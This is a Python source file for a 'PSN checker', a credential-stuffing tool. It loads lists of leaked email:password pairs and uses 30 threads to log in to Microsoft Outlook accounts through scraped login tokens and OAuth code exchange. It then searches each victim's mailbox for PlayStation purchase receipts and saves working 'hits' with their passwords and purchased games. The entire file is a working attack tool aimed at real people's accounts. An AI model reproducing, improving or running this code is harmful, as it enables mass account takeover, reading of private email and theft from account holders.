import requests
import json
import uuid
import re
import time
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock


class PSNAccountChecker:
    """PSN Checker Engine - Actually checks accounts"""
    
    def __init__(self, debug=False):
        self.debug = debug
        self.timeout = 25
        
    def log(self, message):
        if self.debug:
            print(f"[DEBUG] {message}")
    
    def check_account(self, email, password):
        """Check single account - returns dict with result"""
        
        session = requests.Session()
        
        try:
            self.log(f"Checking: {email}")
            
            # Step 1: Check email type
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": str(uuid.uuid4()),
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            r1 = session.get(url1, headers=headers1, timeout=self.timeout)
            
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "Not Hotmail/Outlook"}
            if "MSAccount" not in r1.text:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "Not Microsoft account"}
            
            time.sleep(0.3)
            
            # Step 2: Get login page
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=self.timeout)
            
            # Extract PPFT and post URL
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                ppft_match = re.search(r'name="PPFT".*?value="([^"]+)"', r2.text)
                if not ppft_match:
                    return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "Parse error"}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            self.log(f"PPFT found, posting to: {post_url[:50]}...")
            
            # Step 3: Post credentials
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=self.timeout)
            
            response_text = r3.text.lower()
            
            # Check for errors
            if "account or password is incorrect" in response_text or "password is incorrect" in response_text:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "Wrong password"}
            
            if "identity/confirm" in response_text or "consent" in response_text:
                return {"status": "2FA", "email": email, "password": password, "orders": 0, "reason": "2FA required"}
            
            if "abuse" in response_text:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "Account suspended"}
            
            # Get authorization code
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "No redirect"}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "No auth code"}
            
            code = code_match.group(1)
            
            # Get CID from cookies
            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                mspcid = session.cookies.get("MSPOK", "")
            if not mspcid:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "No CID"}
            
            cid = mspcid.upper()
            self.log(f"CID: {cid}")
            
            # Step 4: Exchange code for token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                                   data=token_data, 
                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                                   timeout=self.timeout)
            
            if "access_token" not in r4.text:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "Token error"}
            
            token_json = r4.json()
            access_token = token_json["access_token"]
            
            self.log("✓ Access token obtained, checking PSN...")
            
            # Step 5: Check PSN orders
            psn_orders, purchases = self.check_psn_orders(session, access_token, cid)
            
            session.close()
            
            if psn_orders > 0:
                return {
                    "status": "HIT",
                    "email": email,
                    "password": password,
                    "orders": psn_orders,
                    "purchases": purchases,
                    "reason": f"Found {psn_orders} orders"
                }
            else:
                return {
                    "status": "HIT", 
                    "email": email, 
                    "password": password, 
                    "orders": 0,
                    "purchases": [],
                    "reason": "No PSN orders"
                }
            
        except requests.Timeout:
            return {"status": "ERROR", "email": email, "password": password, "orders": 0, "reason": "Timeout"}
        except Exception as e:
            self.log(f"Exception: {str(e)}")
            return {"status": "ERROR", "email": email, "password": password, "orders": 0, "reason": str(e)[:50]}
        finally:
            try:
                session.close()
            except:
                pass
    
    def check_psn_orders(self, session, access_token, cid):
        """Search for PlayStation orders and return count and purchases"""
        try:
            self.log("Searching PlayStation emails...")
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number"},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            
            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            
            r = session.post(search_url, json=payload, headers=headers, timeout=self.timeout)
            
            purchases = []
            total_orders = 0
            
            if r.status_code == 200:
                data = r.json()
                
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total_orders = result_set.get('Total', 0)
                        
                        self.log(f"Found {total_orders} PSN emails")
                        
                        if 'Results' in result_set and total_orders > 0:
                            for result in result_set['Results'][:10]:
                                purchase_info = {}
                                
                                if 'Preview' in result:
                                    preview = result['Preview']
                                    full_text = result.get('ItemBody', {}).get('Content', preview)
                                    
                                    # Extract game name
                                    game_patterns = [
                                        r'Thank you for purchasing\s+([^\.]+?)(?:\s+from|\.|$)',
                                        r'You\'ve bought\s+([^\.]+?)(?:\s+from|\.|$)',
                                        r'Order.*?:\s*([A-Z][^\n\.]{5,60}?)(?:\s+has|\s+is|\s+for|\.|$)',
                                        r'purchased\s+([^\.]{5,60}?)\s+(?:for|from)',
                                        r'Game:\s*([^\n\.]{3,60}?)(?:\n|$)',
                                        r'Content:\s*([^\n\.]{3,60}?)(?:\n|$)',
                                    ]
                                    
                                    for pattern in game_patterns:
                                        match = re.search(pattern, full_text, re.IGNORECASE)
                                        if match:
                                            item_name = match.group(1).strip()
                                            item_name = re.sub(r'\s+', ' ', item_name)
                                            item_name = item_name.replace('\\r', '').replace('\\n', '')
                                            if 5 < len(item_name) < 100:
                                                purchase_info['item'] = item_name
                                                break
                                    
                                    # Try subject if no item
                                    if not purchase_info.get('item') and 'Subject' in result:
                                        subject = result['Subject']
                                        subject_patterns = [
                                            r'Your PlayStation.*?purchase.*?:\s*([^\|]+)',
                                            r'Receipt.*?:\s*([^\|]+)',
                                            r'Order.*?:\s*([^\|]+)',
                                        ]
                                        for pattern in subject_patterns:
                                            match = re.search(pattern, subject, re.IGNORECASE)
                                            if match:
                                                purchase_info['item'] = match.group(1).strip()
                                                break
                                    
                                    # Extract price
                                    price_patterns = [
                                        r'(?:Total|Amount|Price)[\s:]*[\$€£¥]\s*(\d+[\.,]\d{2})',
                                        r'[\$€£¥]\s*(\d+[\.,]\d{2})',
                                    ]
                                    for pattern in price_patterns:
                                        price_match = re.search(pattern, full_text)
                                        if price_match:
                                            purchase_info['price'] = price_match.group(0)
                                            break
                                    
                                    # Extract date
                                    if 'ReceivedTime' in result:
                                        try:
                                            date_str = result['ReceivedTime']
                                            date_obj = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
                                            purchase_info['date'] = date_obj.strftime('%Y-%m-%d')
                                        except:
                                            pass
                                
                                if purchase_info and purchase_info.get('item'):
                                    purchases.append(purchase_info)
            
            return total_orders, purchases
            
        except Exception as e:
            self.log(f"PSN check error: {str(e)}")
            return 0, []


class PSNBatchChecker:
    """30-thread batch checker"""
    
    def __init__(self, max_workers=30):
        self.engine = PSNAccountChecker()
        self.max_workers = max_workers
        self.results = []
        self.processed = 0
        self.hits = 0
        self.twofa = 0
        self.bad = 0
        self.lock = Lock()
        self.progress_callback = None
        
    def set_callback(self, callback):
        """Set progress callback function"""
        self.progress_callback = callback
    
    def remove_duplicates(self, combos):
        """Remove duplicate emails from combo list"""
        seen = set()
        unique = []
        for email, password in combos:
            email_lower = email.lower()
            if email_lower not in seen:
                seen.add(email_lower)
                unique.append((email, password))
        return unique
    
    def check_combo_file(self, file_path):
        """
        Check all combos in a text file with 30 threads
        Returns dict with results
        """
        
        # Load combos
        combos = []
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            combos.append((parts[0].strip(), parts[1].strip()))
        except Exception as e:
            return {"error": f"Failed to read file: {str(e)}"}
        
        if not combos:
            return {"error": "No valid combos found in file"}
        
        # Remove duplicates
        original_count = len(combos)
        combos = self.remove_duplicates(combos)
        duplicates_removed = original_count - len(combos)
        
        total = len(combos)
        self.results = []
        self.processed = 0
        self.hits = 0
        self.twofa = 0
        self.bad = 0
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_combo = {
                executor.submit(self.engine.check_account, email, pwd): (email, pwd)
                for email, pwd in combos
            }
            
            for future in as_completed(future_to_combo):
                with self.lock:
                    self.processed += 1
                    
                    try:
                        result = future.result()
                        self.results.append(result)
                        
                        if result["status"] == "HIT":
                            if result.get("orders", 0) > 0:
                                self.hits += 1
                        elif result["status"] == "2FA":
                            self.twofa += 1
                        else:
                            self.bad += 1
                        
                        # Call callback with progress
                        if self.progress_callback:
                            self.progress_callback({
                                "type": "HIT" if result["status"] == "HIT" and result.get("orders", 0) > 0 else "PROGRESS",
                                "result": result if result["status"] == "HIT" and result.get("orders", 0) > 0 else None,
                                "processed": self.processed,
                                "total": total,
                                "hits": self.hits,
                                "twofa": self.twofa,
                                "bad": self.bad
                            })
                    except Exception as e:
                        pass
        
        elapsed = time.time() - start_time
        
        return {
            "success": True,
            "original_total": original_count,
            "duplicates_removed": duplicates_removed,
            "total": total,
            "processed": self.processed,
            "hits": self.hits,
            "twofa": self.twofa,
            "bad": self.bad,
            "time": elapsed,
            "cpm": (self.processed / elapsed * 60) if elapsed > 0 else 0,
            "results": self.results
        }
    
    def save_results(self, output_file="psn_hits.txt"):
        """Save only accounts with PSN purchases"""
        hits_with_orders = [r for r in self.results if r["status"] == "HIT" and r.get("orders", 0) > 0]
        
        with open(output_file, 'w', encoding='utf-8') as f:
            for result in hits_with_orders:
                f.write(f"{result['email']}:{result['password']} | {result['orders']} orders\n")
                # Also write purchases if any
                if result.get('purchases'):
                    for purchase in result['purchases'][:3]:
                        f.write(f"  - {purchase.get('item', 'Unknown')}\n")
        
        return len(hits_with_orders)
    
    def get_hits_text(self, max_display=20):
        """Get formatted text of all hits with orders"""
        hits = [r for r in self.results if r["status"] == "HIT" and r.get("orders", 0) > 0]
        if not hits:
            return "❌ No PSN hits found"
        
        text = "🎮 **PSN HITS FOUND:**\n\n"
        for i, r in enumerate(hits[:max_display], 1):
            text += f"✅ `{r['email']}:{r['password']}` | {r['orders']} orders\n"
            # Show first purchase if available
            if r.get('purchases') and len(r['purchases']) > 0:
                first_game = r['purchases'][0].get('item', 'Unknown')[:40]
                text += f"   └─ Latest: {first_game}\n"
        
        if len(hits) > max_display:
            text += f"\n... and {len(hits) - max_display} more"
        
        return text


# For testing directly
if __name__ == "__main__":
    print("="*60)
    print("PSN ENGINE TEST")
    print("="*60)
    
    email = input("Email: ").strip()
    password = input("Password: ").strip()
    
    checker = PSNAccountChecker(debug=True)
    result = checker.check_account(email, password)
    
    print("\n" + "="*60)
    print("RESULT:")
    print("="*60)
    
    if result["status"] == "HIT":
        if result["orders"] > 0:
            print(f"✅ VALID ACCOUNT WITH PSN PURCHASES!")
            print(f"📧 {result['email']}:{result['password']} | {result['orders']} orders")
            if result.get('purchases'):
                print(f"\n📦 Recent purchases:")
                for p in result['purchases'][:3]:
                    print(f"   • {p.get('item', 'Unknown')}")
        else:
            print(f"✅ VALID ACCOUNT - NO PSN PURCHASES")
            print(f"📧 {result['email']}:{result['password']} | no orders")
    elif result["status"] == "2FA":
        print(f"🔐 2FA PROTECTED")
        print(f"📧 {result['email']}:{result['password']}")
    else:
        print(f"❌ {result['status']}: {result.get('reason', 'Unknown')}")
    
    print("="*60)